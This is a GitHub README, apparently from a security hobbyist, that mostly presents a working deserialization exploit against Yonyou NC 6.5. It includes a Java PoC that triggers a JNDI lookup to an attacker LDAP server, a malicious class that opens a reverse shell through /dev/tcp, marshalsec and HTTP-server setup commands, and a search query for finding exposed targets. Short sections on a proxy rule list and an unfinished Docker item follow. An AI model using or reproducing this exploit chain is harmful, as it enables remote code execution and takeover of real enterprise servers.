# Bigger than Bigger

大文件存储；供后来者学习探讨。

# ATTENTION PLZ

- 1.由于传播、利用此库/文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本文作者不为此承担任何责任。

- Any direct or indirect consequences and losses caused by the dissemination and use of the information provided by this library/text are the responsibility of the user himself, and the author of this article does not bear any responsibility for this.

- 2.转载请申明出处：*[Bigger than Bigger](https://github.com/Bin4xin/bigger-than-bigger)*

- Please state the source for reprinting : *[Bigger than Bigger](https://github.com/Bin4xin/bigger-than-bigger)*

## 零：用友nc6.5反序列化依赖jar包

- 部分依赖jar包在安装完nc6.5系统后，一般在`C://yonyou//home//lib//`目录下，前提需要有nc6.5的安装包；或者：
    - *[点击更多以了解yonyou-nc6.5-lib](https://github.com/Bin4xin/bigger-than-bigger/tree/master/yonyou-nc6.5-lib)*
        - yonyou NC v6.5 ESA 
        - fofa：title= "YONYOU NC"
        - 本机运行环境
        ```
        java version "1.8.0_181"
        Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
        Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)

        javac 1.8.0_181
        ```

### 0x01：攻击java代码

```java
import nc.bs.framework.common.NCLocator;

import java.util.Properties;


public class poc {

    public static void attack(String url, String jndipath) {
        Properties env = new Properties();
        if (!url.startsWith("http")) {
            url = "http://" + url;
        }
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    public static void main(String[] args) {
        attack("http://192.168.1.1:81", "ldap://192.168.1.2:1099/remote");
    }
}
```
运行起来主要报`classNotFound`，必需第三方jar包如下：

- ncdepend.jar
- log4j-1.2.15.jar
- log.jar

### 0x02：远程利用java恶意代码

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class remote implements ObjectFactory, Serializable {

    public remote() {
        try{
            java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","sh -i >& /dev/tcp/ip/port 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

### 0x03：使用方法

- jetbrains IDEA ：`file -> New -> Project -> Java`
	- *[点击更多以了解：IDEA与JAVA](https://blog.csdn.net/oschina_41790905/article/details/79475187)*
	- `src目录 -> New -> Java Class -> poc.java`即可；
	- `Project Structure -> Librabries -> + `添加lib文件夹即可；  
	
- 恶意LDAP：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.2:8000/#remote" 1099`
    - *[点击更多以了解marshalsec](https://github.com/mbechler/marshalsec)*
- HTTP SERVER(remote.class)：`python3 -m http.server`

- 填入主方法下`attck url & jndipath` -> `run poc.main()`即可。

- enjoy.

### 0x04：参考链接

- [用友NC反序列化 简单分析](https://blog.sari3l.com/posts/608d18f0/#jwdp)
- [用友nc6.5详细安装过程](https://blog.csdn.net/weixin_38766356/article/details/103983787)

## 一：WALL_LISTS

### 1x01：使用方法
- SwitchyOmega
    - auto switch
    - 规则列表设置 -> AutoProxy
    - 规则列表网址  -> `https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/WALL_LISTS/lists.txt`
    - 立即更新

### 1x02：参考链接

- *[gfwlist/gfwlist](https://github.com/gfwlist/gfwlist)*

## 二：Bin4wvsDocker

### 2x01：🚧UNDER CONSTRUCTION🚧
